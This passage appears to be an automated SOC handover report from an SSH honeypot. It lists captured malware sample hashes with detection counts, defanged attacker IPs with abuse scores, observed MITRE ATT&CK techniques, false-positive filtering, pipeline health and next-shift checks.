| `85.251.45[.]115` | 1 | 2026-06-01 11:44 | 2026-06-01 11:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `89.37.172[.]157` | 1 | 2026-06-01 17:44 | 2026-06-01 17:44 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `159.203.20[.]239` | CA | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `223.100.248[.]64` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `218.150.184[.]241` | KR | Korea Telecom | **100** ⚠️ | 0 |
| `101.79.167[.]192` | HK | CDNetworks | **100** ⚠️ | 6 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `64.227.101[.]30` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `102.88.137[.]80` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `117.247.23[.]131` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 50 |
| `181.188.172[.]6` | BO | Telefónica Celular de Bolivia S.A. | **100** ⚠️ | 50 |
| `186.248.197[.]77` | BR | AMERICAN TOWER DO BRASIL-COMUNICAÇÂO MULTIMÍDIA LT | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 281 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 131 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 106 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 56 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 55 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 558 cases |
| Tool 34  | Credential Extractor        | ✅ 238 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 82 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (3.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 53 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 106 priority case(s) shown individually · 72 recon entry/entries in table (31 group(s) consolidating 391 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-01T17:48:37Z_
